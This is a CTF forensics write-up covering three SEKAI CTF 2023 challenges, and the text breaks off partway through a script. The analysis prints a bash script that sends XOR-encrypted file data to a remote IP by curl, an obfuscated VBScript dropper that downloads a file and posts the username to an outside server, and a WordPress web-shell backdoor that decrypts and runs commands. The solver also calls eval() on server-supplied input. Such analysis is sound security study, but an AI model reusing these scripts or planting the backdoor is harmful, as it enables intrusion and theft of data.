---
weight: 5
title: "SEKAI CTF 2023"
date: 2023-08-29T17:55:28+08:00
lastmod: 2023-08-29T17:55:28+08:00
draft: false
author: "1259iknowthat"
description: "Full Forensics challenges from SEKAI CTF 2023 🌸"
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["Forensics"]
categories: ["WriteUps"]

twemoji: false
lightgallery: true
---

Full Forensics challenges from SEKAI CTF 2023 🌸

<!--more-->

## Preface

By the end of this month, August 25th to 27th, me and my team have participated in SEKAI CTF. We ended up 27th place, made a big progress compare to last year.

I've solved all of forensics challenges so I'll keep a writeup here 😊

{{< image src="images/writeups/sekai/solve.png" caption="Solves" >}}

____

## Eval Me

{{< admonition >}}
I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?

Author: Guesslemonger

nc chals.sekai.team 9000
{{< /admonition >}}

Base on the description, looks like we need to connect to the remote server and do stuff.

I decided to look over the given packet capture.

{{< image src="images/writeups/sekai/sustraffic.png" caption="Suspicious traffic" >}}

The pcap has plenty of HTTP/JSON packets. They are all contain the same JSON structure, the difference is the data in it.

{{< image src="images/writeups/sekai/httpjson.png" caption="JSON data" >}}

We have about 102 JSON packets, I think this is our flag. 

Further context? We should leave this aside and focus on the remote server because, we can't dive any deeper in the pcap.

Here is what happen when we connected to the server:

{{< image src="images/writeups/sekai/server.png" caption="Server response" >}}

From here, I wrote a small script to automating the process.

```py
from pwn import *

HOST = 'chals.sekai.team'
PORT = 9000

r = remote(HOST, PORT)

rec = r.recvuntil('Do it 100 times within time limit and you get the flag :)\n\n')
print(rec.decode())
for i in range(100):
    rec = r.recvline()
    print(rec)
    data = eval(rec.decode())
    r.sendline(str(data).encode())
    rec = r.recvline()
    print(rec)
```

After running about 70-71 rounds, you will get this python payload:

{{< image src="images/writeups/sekai/payload.png" caption="Payload" >}}

It contains a command which will drop the malicious one to our machine.

`curl -sL https://shorturl.at/fgjvU -o extract.sh`

Access the url and download the script, here it is:

```sh
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```
This script will use this key `s3k@1_v3ry_w0w` to xor the flag and then send those values to a server as HTTP/JSON.

Back to the capture, we will dump out all JSON `data` field's values by using this command

```
$ tshark -r capture.pcapng -Y "http.request.method == POST" -Tfields -e json.value.string | tr -d '\n'
20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f
```

After xoring the key and the value, we got the flag!

```py
>>> s = bytes.fromhex('20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f')
>>> key = [ord(i) for i in 's3k@1_v3ry_w0w']
>>> for i in range(len(s)):
...     data = key[i % len(key)] ^ s[i]
...     print(chr(data),end='')
...
SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}
```

##### FLAG: 

**SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}**

____

## DEF CON Invitation

{{< admonition >}}
As you all know, DEF CON CTF Qualifier 2023 was really competitive and we didn't make it. Surprisingly, 2 months before the finals in Las Vegas, we received an official invitation from Nautilus Institute to attend the event. Should we accept the invitation and schedule the trip?

Author: sahuang

                                              ⚠ WARNING ⚠

This challenge may contain simulated malware. While harmless, we recommend using a dedicated VM for a safer environment. We are not responsible for any damages caused.
{{< /admonition >}}

The challenge give us a mail seems to be an invitation to DEFCON Final.

{{< image src="images/writeups/sekai/mail.png" caption="Malicious Mail" >}}

Let's see what is the attachment. Unfortunately, I couldn't manage to open the file so I decided to open it in VSCode.

{{< image src="images/writeups/sekai/susurl.png" caption="Suspicious url" >}}

Inside the ics file, we got an URL point to an online map. The map seems to be innocent but it's not. It leads us to a malicious VBScript which you can see as "Download Offline Map Image".

{{< image src="images/writeups/sekai/map.png" caption="Malicious map" >}}

{{< image src="images/writeups/sekai/vbs.png" caption="Malicious script" >}}

The script contains 801 lines of code, such a big source. But we can strip off unused data like comments to reduce the file size. 

First look at the script, we can be mislead but trust me, this one will be easy. After an hour trying stuff, here is my conclusion:

### MD5 hashing

```vb
Function XA3bVjQ3(A0CQ5, B9HW3)
    Dim nFBRW6, X7IDP
    On Error Resume Next
    Set nFBRW6 = CreateObject(StRREverse("llehS.tpircSW"))
    X7IDP = nFBRW6.RegRead(A0CQ5)
    If err.number <> 0 Then
        xA3bVjQ3 = B9HW3
    Else
        xA3bVjQ3 = X7IDP
    End If
    Set nFBRW6 = Nothing
End Function

strComputer = "."
 
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & _ 
    strComputer & "\root\default:StdRegProv")
 
strKeyPath = "SYSTEM\CurrentControlSet\Control"
strUser = CreateObject("WScript.Network").UserName

oReg.EnumValues HKEY_LOCAL_MACHINE, strKeyPath, _
    arrValueNames, arrValueTypes

res = Msgbox("Hi " & strUser & ", your data have been compromised!", vbOKCancel+vbCritical, "")

For jj=0 To UBound(arrValueNames)
    Select Case arrValueTypes(jj)
        Case REG_SZ, REG_EXPAND_SZ, REG_DWORD
            str = XA3bVjQ3("HKLM\" & strKeyPath & "\" & arrValueNames(jj), "dummy")
            res = Msgbox(arrValueNames(jj) & " LEAKED: " & query(str), vbOKCancel+vbCritical, "")
			WScript.Echo query(str)
    End Select 
Next
```
The above block will scan through your registry key and hash its value's data by using MD5 (`XA3bVjQ3()`). In this case, the key and values will be located at `HKLM\SYSTEM\CurrentControlSet\Control`.

{{< image src="images/writeups/sekai/reg.png" caption="Values" >}}

Obviously, these below functions will be a part of the process.

{{< image src="images/writeups/sekai/md5.png" caption="MD5" >}}

### Dropping

```vb
ewkjunfw = Replace("68IlllIllIIIllllIllII74IlllIllIIIllllIllII74IlllIllIIIllllIllII70IlllIllIIIllllIllII73IlllIllIIIllllIllII3aIlllIllIIIllllIllII2fIlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII6fIlllIllIIIllllIllII77IlllIllIIIllllIllII6eIlllIllIIIllllIllII6cIlllIllIIIllllIllII6fIlllIllIIIllllIllII61IlllIllIIIllllIllII64IlllIllIIIllllIllII31IlllIllIIIllllIllII36IlllIllIIIllllIllII34IlllIllIIIllllIllII37IlllIllIIIllllIllII2eIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII66IlllIllIIIllllIllII69IlllIllIIIllllIllII72IlllIllIIIllllIllII65IlllIllIIIllllIllII2eIlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6dIlllIllIIIllllIllII2fIlllIllIIIllllIllII6cIlllIllIIIllllIllII31IlllIllIIIllllIllII38IlllIllIIIllllIllII38IlllIllIIIllllIllII75IlllIllIIIllllIllII32IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII71IlllIllIIIllllIllII67IlllIllIIIllllIllII33IlllIllIIIllllIllII66IlllIllIIIllllIllII4fIlllIllIIIllllIllII6fIlllIllIIIllllIllII4cIlllIllIIIllllIllII70IlllIllIIIllllIllII69IlllIllIIIllllIllII6cIlllIllIIIllllIllII63IlllIllIIIllllIllII49IlllIllIIIllllIllII38IlllIllIIIllllIllII39IlllIllIIIllllIllII70IlllIllIIIllllIllII30IlllIllIIIllllIllII5fIlllIllIIIllllIllII68IlllIllIIIllllIllII34IlllIllIIIllllIllII45IlllIllIIIllllIllII30IlllIllIIIllllIllII63IlllIllIIIllllIllII47IlllIllIIIllllIllII4cIlllIllIIIllllIllII6aIlllIllIIIllllIllII6bIlllIllIIIllllIllII5fIlllIllIIIllllIllII75IlllIllIIIllllIllII76IlllIllIIIllllIllII42IlllIllIIIllllIllII55IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII45IlllIllIIIllllIllII5fIlllIllIIIllllIllII72IlllIllIIIllllIllII4dIlllIllIIIllllIllII5aIlllIllIIIllllIllII2dIlllIllIIIllllIllII48IlllIllIIIllllIllII35IlllIllIIIllllIllII2dIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII39IlllIllIIIllllIllII4bIlllIllIIIllllIllII72IlllIllIIIllllIllII39IlllIllIIIllllIllII53IlllIllIIIllllIllII51IlllIllIIIllllIllII4cIlllIllIIIllllIllII56IlllIllIIIllllIllII51IlllIllIIIllllIllII61IlllIllIIIllllIllII4bIlllIllIIIllllIllII53IlllIllIIIllllIllII69IlllIllIIIllllIllII4bIlllIllIIIllllIllII63IlllIllIIIllllIllII45IlllIllIIIllllIllII76IlllIllIIIllllIllII4aIlllIllIIIllllIllII4fIlllIllIIIllllIllII2dIlllIllIIIllllIllII45IlllIllIIIllllIllII6bIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII53IlllIllIIIllllIllII55IlllIllIIIllllIllII71IlllIllIIIllllIllII57IlllIllIIIllllIllII6cIlllIllIIIllllIllII72IlllIllIIIllllIllII4eIlllIllIIIllllIllII36IlllIllIIIllllIllII53IlllIllIIIllllIllII7aIlllIllIIIllllIllII58IlllIllIIIllllIllII67IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII4cIlllIllIIIllllIllII59IlllIllIIIllllIllII42IlllIllIIIllllIllII68IlllIllIIIllllIllII2dIlllIllIIIllllIllII46IlllIllIIIllllIllII35IlllIllIIIllllIllII65IlllIllIIIllllIllII6dIlllIllIIIllllIllII34IlllIllIIIllllIllII49IlllIllIIIllllIllII41IlllIllIIIllllIllII34IlllIllIIIllllIllII69IlllIllIIIllllIllII58IlllIllIIIllllIllII33IlllIllIIIllllIllII74IlllIllIIIllllIllII4fIlllIllIIIllllIllII49IlllIllIIIllllIllII47IlllIllIIIllllIllII68IlllIllIIIllllIllII30IlllIllIIIllllIllII45IlllIllIIIllllIllII6aIlllIllIIIllllIllII34IlllIllIIIllllIllII36IlllIllIIIllllIllII47IlllIllIIIllllIllII6cIlllIllIIIllllIllII77IlllIllIIIllllIllII76IlllIllIIIllllIllII4cIlllIllIIIllllIllII4fIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII38IlllIllIIIllllIllII70IlllIllIIIllllIllII7aIlllIllIIIllllIllII76IlllIllIIIllllIllII75IlllIllIIIllllIllII79IlllIllIIIllllIllII39IlllIllIIIllllIllII31IlllIllIIIllllIllII55IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII6aIlllIllIIIllllIllII31IlllIllIIIllllIllII72IlllIllIIIllllIllII32IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII6aIlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII59IlllIllIIIllllIllII73IlllIllIIIllllIllII55IlllIllIIIllllIllII4eIlllIllIIIllllIllII63IlllIllIIIllllIllII73IlllIllIIIllllIllII73IlllIllIIIllllIllII50IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII30IlllIllIIIllllIllII38IlllIllIIIllllIllII64IlllIllIIIllllIllII73IlllIllIIIllllIllII6bIlllIllIIIllllIllII57IlllIllIIIllllIllII52IlllIllIIIllllIllII70IlllIllIIIllllIllII6bIlllIllIIIllllIllII41IlllIllIIIllllIllII49IlllIllIIIllllIllII2fIlllIllIIIllllIllII79IlllIllIIIllllIllII65IlllIllIIIllllIllII61IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII35IlllIllIIIllllIllII68IlllIllIIIllllIllII76IlllIllIIIllllIllII67IlllIllIIIllllIllII70IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII76IlllIllIIIllllIllII6dIlllIllIIIllllIllII76IlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII65IlllIllIIIllllIllII66IlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6eIlllIllIIIllllIllII2dIlllIllIIIllllIllII66IlllIllIIIllllIllII6cIlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII70IlllIllIIIllllIllII6eIlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII58IlllIllIIIllllIllII4fIlllIllIIIllllIllII52IlllIllIIIllllIllII65IlllIllIIIllllIllII64", "IlllIllIIIllllIllII", " ")

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", OwOwO(ewkjunfw), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile Nautilus(StRREVErsE(replace("=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y", "###############_###", "z")), False), 2
end with
```

This part will download an image from an url and then write it to the system. The url here is `ewkjunfw` variable which will be deobfuscated in this `xHttp.Open "GET", OwOwO(ewkjunfw), False`

```vb
Function OwOwO(h)
  Dim a : a = Split(h)
  Dim i
  For i = 0 To UBound(a)
      a(i) = Chr("&H" & a(i))
  Next
  OwOwO = Join(a, "")
End Function
```

As you can see it just replace `IlllIllIIIllllIllII` in the whole long string with space character then convert to ASCII.

```
>>> s = "68IlllIllIIIllllIllII74IlllIllIIIllllI[...]52IlllIllIIIllllIllII65IlllIllIIIllllIllII64".replace("IlllIllIIIllllIllII", "")
>>> bytes.fromhex(s)
b'https://download1647.mediafire.com/l188u2d532qg3fOoLpilcI89p0_h4E0cGLjk_uvBUiag7E_rMZ-H5-me9Kr9SQLVQaKSiKcEvJO-EkfTSUqWlrN6SzXgI0LYBh-F5em4IA4iX3tOIGh0Ej46GlwvLOfT8pzvuy91Utej1r2I0jg7YsUNcssPted508dskWRpkAI/yea535hvgp32vmv/defcon-flag.png.XORed'
```

```vb
Function Nautilus(ByVal sBase64EncodedText, ByVal fIsUtf16LE)
    Dim sTextEncoding
    if fIsUtf16LE Then sTextEncoding = "utf-16le" Else sTextEncoding = "utf-8"
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        .Text = sBase64EncodedText
        Nautilus = BUtil(.NodeTypedValue, sTextEncoding)
    End With
End Function

function BUtil(ByVal byteArray, ByVal sTextEncoding)
    If LCase(sTextEncoding) = "utf-16le" then
        BUtil = CStr(byteArray)
    Else
        With CreateObject("ADODB.Stream")
            .Type = 1
            .Open
            .Write byteArray
            .Position = 0
            .Type = 2
            .CharSet = sTextEncoding
            BUtil = .ReadText
            .Close
        End With
    End If
end function
```
`Nautilus` function is just a base64 decode function.

```
>>> from base64 import b64decode
>>> s = "=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y".replace('###############_###', 'z')[::-1]
>>> b64decode(s)
b'c:\\temp\\defcon-flag.png.compromised'
```

### Finding the key

So we have a picture which contains the flag in it but it has been xored. We don't have the key right now, I guess it must be in the last part of the script.

{{< image src="images/writeups/sekai/last.png" caption="Obfuscated part" >}}

About `CLng()`, it will convert a value to a long integer. Thus, this part just do one job: convert numbers to ASCII characters. Simply write a python script and here is our result.

```vb
Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim url: url = "http://20.106.250.46/sendUserData"

With http
  Call .Open("POST", url, False)
  Call .SetRequestHeader("Content-Type", "application/json")
  Call .Send("{""username"":""" & strUser & """}")
End With

res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")
```

The script will send system's current username to the attacker's server.

`strUser = CreateObject("WScript.Network").UserName`

From here, I spent hours trying to find where the key is but no result. Suddenly, a friend remind me that what would happen if we send username as `admin` to the server? You can use Burpsuite, python requests or run that VB to POST the data to the server. Here is our key in the response.

{{< image src="images/writeups/sekai/key.png" caption="Key is responsed from the server" >}}

Our job is just taking the key and xor the image.

{{< image src="images/writeups/sekai/xoredflag.png" caption="Got the flag!" >}}

Actually, you can do a known plaintext xor to recover the key from the given picture with a temp one. But I couldn't get it right so I will leave it here for you guys to improve it.

```py
from pwn import xor
import string

def GetReadable(byte):
    s = ''
    for b in byte:
        try:
            s += chr(b) if chr(b) in string.printable else ''
        except:
            pass
    return s
f1 = open('defcon-flag.png.XORed', 'rb').read()
f2 = open('temp.png', 'rb').read()

data1 = GetReadable(xor(f1[:18], f2[:18]))
data2 = GetReadable(xor(f1[20:22], f2[20:22]))
data3 = GetReadable(xor(f1[24:29], f2[24:29]))
data4 = GetReadable(xor(f1[33:33+15], f2[33:33+15]))
data5 = GetReadable(xor(f1[-12:], f2[-12:]))

key = "{} {} {} {} {}".format(
    data1, data2, data3, data4, data5
)

print(key)
```

##### FLAG: 

**SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}**

____

## infected

{{< admonition >}}
Our systems recently got ransomwared, and we tracked the origin to our web server. We’re not sure how they got access, can you find out?

Author: Legoclones
{{< /admonition >}}

We have two artifacts to analyze, one is packet capture, another is wordpress' source code.

Because we didn't know what happen to the source, we can't dive in it directly for now. In that case, we must understand what's going on by going through the capture.

{{< image src="images/writeups/sekai/attacking.png" caption="Attacker's footprint" >}}

After filtering the pcap to `http` requests, we can see that this hacker was fuzzing the website's vulnerabilities. He used a tool or his own script to bruteforcing website's path, including some XSS payloads.

{{< image src="images/writeups/sekai/404.png" caption="404 responses" >}}

If we exclude those 200 respones which are normal js files or config files, the others have 404 code. I think the attacker has nothing after trying to get some vuln paths. Assuming that our theory is corrected, we can move on to POST requests to see if there's anything strange.

{{< image src="images/writeups/sekai/post.png" caption="Strange POST requests to server" >}}

About 19 requests have been made to the webserver but `date.php` gave me a suspicious view.

{{< image src="images/writeups/sekai/suspost.png" caption="Suspicious request and response" >}}

This time, we will look it up in the source. The file will be in `wp-includes` path. Here is its content:

```php
<?php

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    // error was suppressed with the @-operator
    if (0 === error_reporting()) {
        return false;
    }
    
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});

try {
    $ab8a69 = $_FILES['file'];
    $a1721b = fopen($ab8a69['tmp_name'], "r");
    $abdfbe = fread($a1721b,filesize($ab8a69['tmp_name']));
    $ae25f0 = substr($abdfbe, 0, strpos($abdfbe, "..."));
    $aa1090 = substr($abdfbe, strpos($abdfbe, "...") + 3);
    $afd8f0 = "-----BEGIN RSA PRIVATE KEY-----\n".chunk_split(base64_encode($aa1090), 64, "\n")."-----END RSA PRIVATE KEY-----\n";
}
catch (Exception $e) {
    die("");
}

$aa13a9 = "KG2bFhlYm8arwrJfc+xWCYqeoySjgrWnvA9zuVfd/pBwnmC8vAdOTydYKDC0VE10xRTq6+79HX7QgCScYjQ8ogHzkppFN2ifFSBkM1bzWckTl6shvZvp8d7678ZxlPZOhm4q0MtJ7BMFRbZuSKl10o1UDUkwVm7CZfCBQd1NLf0=,OfCbPFExBkpXi5F+SohxpXQLHvICHKF64rUIxVwhR83nMmO0k9Xqjh4+FHMCz0KcFXF5CGR6WUWC+aDqDhJZTgossQ+h1tSEfHpFif87ip0/OEHerOfyfPtQR3E62xUW1++3gm8WB38nkFiP6o1bkIdd9ZYObwQsp0YPlrj6AlA=,MiH8FWh7hHp+Yr2/Kv78WvMItwiwaCiO4DwBTq/IXU99hHUvb8iayOBUzLtr4Xg9wBGzHq73fY266XK+60YboIC15Es1J7vN8XRsUhlxavf8ssVmYDz4gz08+V9Ow+0k39Ef9Ic4NSiN+vbHCyCdFkvFsbfuUbyCHoxZyAjp1Z4=,pjnJiJt4sgRW48wgVIEmygN5+0HJiAVma5JPxQMIcpYqZUBsPkAW6/2wcMjqkZ7wzXdYZy706JV5gGm1F2egrtEtrsfo2V5eVMOsgLmB/ApVYmYsJ0DBl/8npo0JtvKM3dMeOg9LL5v+26QLKOxDRSX74rAYNSw4iPeH5y4SxCQ=,KkU+QkZ1PbLmKmfcLUGxUDMIWTKoYo9YAfiwe5heK1WwbuqoH2ra3WEv3vLCePK6ovlJoybcCeutQNY5AiR5OOuEAS/uM82WBCffE03cxezkkQPWbA43bstduUHgM6afqxPj6YaFI/C2ARQCYOWGMzYLeCdLkuKfvriudv/XnO0=,CtiyfFrf9+p8L2m6js0jmyHt5+1kYjfD0uO2Nggvkv+fZuBfGmN2BWxvD+oUBVA2TXkKQi+pBBlsc+9WWIjnL7ZCyWol9qUOHIwGdN8ab2IKI3Zl5qUwIFQcJHGRVeAjGnEOGM8iU5T1JZjO+QwJB9LTvyh8Ki9SGjqqxnNGT/M=,VszkcW2yR61TdtOSpRlh4DZ05SOlNR0n8rOlzdmnE+3RBarszIVsSg+59Yc7B+8+NqAslN32qBcu0sW5e+Vz3ABxdnIgaMoQcJ5Ku9T2p2UbuZ0j+LYxTrcIqnlc+THi8Do9q+Lml34/woKDOIIkKrjHhVnf6dusxI7Dv7z3oU0=,pIDhg8+nNcqxxClYVaYAGKig3/T0KWWbDm0BWN0M3u8ST0Nw6Am/crxXGMddK8m6qW5oyOvWgiD6XdUy0cfUo3zeXCXo3UYa+hxrTIKj1SS/n4LkzQ6egSRq4XK1fECKApY+8eiLEMOvyixnzD2ohs6FA5R/a12bMx8xzLctTG8=,TwB9lsoQC47npnc0Fy+Gt85zuRkuk8e1kPjogierA3tZiA6zs+6Qc6d9Ri7kfpasekO4dhZsM1W9z0n/zWpq+0Xp5tJ77mpryGPfae3KRSTS0QscQMi/ZhD+Pi6ajL3FoxKI7wfZ7RA0OKGSxhbiNHcD6WEShSbHILkuC7wWVMw=,rq0fb0wiKfJyqd3CCVAmwu3a8EKvgZ9B3K7sct8BoeBG/PKbp8a8AC9AbWPqnjYSIcFNkexdH1lXJrvgLKrC4UaqpMdi+Zqu96oc3695VfN0zspAKZkjEUwU8PA+En7R5qwSMD4QLop+2qZ+Tx1DC7Y2QwvqH7kAxwwloou45zw=,eTJY1cWk0XfO166TYwkvxA+6A6Ee5xXv53PtV7nbblXGx8PlVXUa5DU/dAXzTuyO1Ykkh16t0TKlyF/7X1G2S5z8RPjmyzIwhALHWw+zvWhE5hDf3lhZ1co6L9/Y7nSgKwUuWTsi1ZPqlrJTTlCyE+gNJE4M+Rh8QfJ/YQsWMBM=,BBeqrThbTcuSguT+9V2a5w2zTeL2GG+WZx26DXy0Y/sH8D85PMTk2lsVNs0e+yj06RfAkQuq6LrYVyEC9wB63ovSKxKIY0vZLaqxwZwA8RdzVcoOrx1/+acY1WqgeG8ZJdXCK7DFcRakkAclhZYNwJO+yKvto+ytvbWcKo0eeDI=,i5rXk8yQ4RVFvlY+sKFvlD19qAA8+9qTtzEGHXeSI9O+v2TDAoLJQuNnp+m3WTReKf8WN3sZ4CTpvUpXR0UYbZ1TUSHRyvWTkm+2P6E4DXdRvotwp+HyviELbjTrn0ajilPV3+X3DF1m1MaDo5v03gBIFRxCuDJM3CYk8KFw/kQ=,";
$a4b1af = "";

$af5e94 = explode(",", $aa13a9);
foreach ($af5e94 as $a64500) {
    openssl_private_decrypt(base64_decode($a64500), $a64500, $afd8f0);
    $a4b1af .= $a64500;
}

if ($a4b1af == "") {
    die("");
}
else {
    eval($a4b1af);
}
?>
```

The above code will handle POST requests, it takes the body part from the request then split `...`. First part will be the command `$ae25f0`, the second one is the base64 RSA private key `$aa1090`. The key was used to decrypt base64 strings in the source code.

Those base64 strings after decrypting will be like this:

```php
$pvk1 = "-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCyYg7DzqjtPGCUT+q38iZcQDqZFC+lIxqo+g1/OhT45AMPtea0
habVZX77whFsQz5zE3fUXLZCzDnZpvtfr4Y8JSzGdL7O0qf3KAQIfk26YQeKOOje
ECNi5zUk3wf+5QUZjXnvDj+BUr78fV57zMpCBe65+mTiBpFkzsNTYo+VxwIDAQAB
AoGBAKyHPrSPer8JOHf525DRudxbmtFXvsU/cJeiUc+Nw57+GR/m1R4gbj3TDsA8
8VD+sLXoTGuux/FPSVyDrnjbcT25akm0FE+KkBZ6dNLFtOq6WQTe3N8HHDHkpqbZ
qXbmuph4MqZlDpKMbEL1cQ81MkgAdPJnljvrjpIoqn5wZ7cRAkEA1+SjeaueSCu4
4VzXTDOMkBqT5rEfJXnT7fN9eM48dXCd1LotWIL/2xcGkC4OdqT0kQiSs4pOQlcn
Lle18qOL5QJBANOFh3aaoGDfH60ecX2MHDnvHz4CSAIInlNXsPpbhWrt7blmGBeA
nuwIiaQOMzvrj084xk3nI8PMIzdgxUFveDsCQA2w1h0VIQh6nVLNTGnsqvFIfjCW
8t6xhxsD4eUTTwozhg7Db7S5Ofhu0V+7S/eCJnA8FvGDx8q1NCrgLQ2iCXECQDl2
cRKbdy5Z7zUMrDA7O//RIl+qJv3GcZyamg2ph1lBQe+3+JuJ6aKdvya+ZNTGbaxL
9DN9s42hi3+j3nKkYbkCQDy68qEICIdcLPFzv/sEN2JS1Cg21lJMH14ao0M3Di9B
G4oDHVBHCRtDGXOviR8AG0VpghDHheonDFaX5O7VXUM=
-----END RSA PRIVATE KEY-----
";
$pbk1 = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyucnknkBP4whz0YJrblke667f
5g4EfCmKcO2j7c+WEOWmbVBRZ/ETtqOIEM8Hp9rV605R1gJBf7tcxziEoX4wxQm5
nfAqXkHUdloGyK7p7IZTh5tX6KnckCtrwbD7EFwjWBBceVHRmnmVdtF4yIkwaD2S
4tw4O5CVYcIlIAAo6QIDAQAB
-----END PUBLIC KEY-----
";
openssl_private_decrypt($ae25f0, $decrypted, $pvk1);
$result = `{$decrypted} 2>&1`;
$encrypted = "";
$chunks = str_split($result, 116);
foreach ($chunks as $chunk) {
    openssl_public_encrypt($chunk, $tmp, $pbk1);
    $encrypted .= base64_encode($tmp).",";
}
echo $encrypted;
```

As you can see, the `$ae25f0` command will be decrypted in this code by using the second RSA private key. Then it will be executed by ```$result = `{$decrypted} 2>&1`;```.

I wrote a python script to handle the decrypt process. Actually, you can modify date.php to receive and decrypt the input. It's faster than my approach.

```py
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

BASESTR_SOURCE_CODE = "KG2bFhlYm8arwrJfc+xWCYqeoySjgrWnvA9zuVfd/pBwnmC8vAdOTydYKDC0VE10xRTq6+79HX7QgCScYjQ8ogHzkppFN2ifFSBkM1bzWckTl6shvZvp8d7678ZxlPZOhm4q0MtJ7BMFRbZuSKl10o1UDUkwVm7CZfCBQd1NLf0=,OfCbPFExBkpXi5F+SohxpXQLHvICHKF64rUIxVwhR83nMmO0k9Xqjh4+FHMCz0KcFXF5CGR6WUWC+aDqDhJZTgossQ+h1tSEfHpFif87ip0/OEHerOfyfPtQR3E62xUW1++3gm8WB38nkFiP6o1bkIdd9ZYObwQsp0YPlrj6AlA=,MiH8FWh7hHp+Yr2/Kv78WvMItwiwaCiO4DwBTq/IXU99hHUvb8iayOBUzLtr4Xg9wBGzHq73fY266XK+60YboIC15Es1J7vN8XRsUhlxavf8ssVmYDz4gz08+V9Ow+0k39Ef9Ic4NSiN+vbHCyCdFkvFsbfuUbyCHoxZyAjp1Z4=,pjnJiJt4sgRW48wgVIEmygN5+0HJiAVma5JPxQMIcpYqZUBsPkAW6/2wcMjqkZ7wzXdYZy706JV5gGm1F2egrtEtrsfo2V5eVMOsgLmB/ApVYmYsJ0DBl/8npo0JtvKM3dMeOg9LL5v+26QLKOxDRSX74rAYNSw4iPeH5y4SxCQ=,KkU+QkZ1PbLmKmfcLUGxUDMIWTKoYo9YAfiwe5heK1WwbuqoH2ra3WEv3vLCePK6ovlJoybcCeutQNY5AiR5OOuEAS/uM82WBCffE03cxezkkQPWbA43bstduUHgM6afqxPj6YaFI/C2ARQCYOWGMzYLeCdLkuKfvriudv/XnO0=,CtiyfFrf9+p8L2m6js0jmyHt5+1kYjfD0uO2Nggvkv+fZuBfGmN2BWxvD+oUBVA2TXkKQi+pBBlsc+9WWIjnL7ZCyWol9qUOHIwGdN8ab2IKI3Zl5qUwIFQcJHGRVeAjGnEOGM8iU5T1JZjO+QwJB9LTvyh8Ki9SGjqqxnNGT/M=,VszkcW2yR61TdtOSpRlh4DZ05SOlNR0n8rOlzdmnE+3RBarszIVsSg+59Yc7B+8+NqAslN32qBcu0sW5e+Vz3ABxdnIgaMoQcJ5Ku9T2p2UbuZ0j+LYxTrcIqnlc+THi8Do9q+Lml34/woKDOIIkKrjHhVnf6dusxI7Dv7z3oU0=,pIDhg8+nNcqxxClYVaYAGKig3/T0KWWbDm0BWN0M3u8ST0Nw6Am/crxXGMddK8m6qW5oyOvWgiD6XdUy0cfUo3zeXCXo3UYa+hxrTIKj1SS/n4LkzQ6egSRq4XK1fECKApY+8eiLEMOvyixnzD2ohs6FA5R/a12bMx8xzLctTG8=,Tw